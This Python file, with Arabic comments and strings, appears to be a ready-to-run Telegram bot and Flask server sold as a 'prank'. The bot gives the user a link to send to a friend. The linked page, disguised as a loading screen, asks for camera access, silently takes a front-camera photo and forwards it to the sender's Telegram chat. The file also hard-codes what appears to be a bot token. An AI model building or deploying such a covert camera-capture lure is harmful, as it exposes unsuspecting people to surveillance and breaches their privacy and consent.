import telebot
from flask import Flask, request, render_template_string
import threading
import base64
import os

TOKEN = "85888931591:AAHSoSj3rmuAEMcwOVSSWWua8nSN8NCcfJFRtI"  # توكن بوتك
bot = telebot.TeleBot(TOKEN)

app = Flask(__name__)

PRANK_HTML = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري التحميل...</title>
</head>
<body style="text-align:center; font-family:Arial; background:#111; color:#fff; margin:0; padding:20px;">
    <h2>جاري التحميل... انتظر ثواني 😏</h2>
    <video id="video" autoplay playsinline style="width:100%; max-width:640px; display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const ctx = canvas.getContext('2d');

    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
      .then(stream => {
        video.srcObject = stream;
        video.play();
        setTimeout(() => {
          canvas.width = video.videoWidth || 640;
          canvas.height = video.videoHeight || 480;
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
          const dataUrl = canvas.toDataURL('image/jpeg');
          fetch('/upload', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({image: dataUrl, chat_id: "{{ chat_id }}"})
          }).then(() => {
            document.body.innerHTML = "<h1 style='color:#0f0; font-size:2em;'>تم! المقلب نجح 😂</h1>";
          }).catch(err => console.error(err));
        }, 4000);
      })
      .catch(err => {
        document.body.innerHTML = "<h1 style='color:#f00;'>خطأ: لازم تسمح بالكاميرا 😅<br>" + err.message + "</h1>";
      });
    </script>
</body>
</html>
"""

@app.route('/prank/<chat_id>')
def prank(chat_id):
    return render_template_string(PRANK_HTML, chat_id=chat_id)

@app.route('/upload', methods=['POST'])
def upload():
    data = request.json
    img_data = data['image'].split(',')[1]
    chat_id = data['chat_id']
    img_bytes = base64.b64decode(img_data)
    bot.send_photo(chat_id, img_bytes, caption="الصورة من المقلب 📸😈")
    return "OK"

@bot.message_handler(commands=['start'])
def start(message):
    link = f"https://{request.host}/prank/{message.chat.id}"
    bot.reply_to(message, f"رابط المقلب جاهز! ارسله لصديقك:\n{link}\n(افتحه في Safari وسمح بالكاميرا)")

def run_flask():
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)

if __name__ == '__main__':
    threading.Thread(target=run_flask, daemon=True).start()
    bot.infinity_polling()
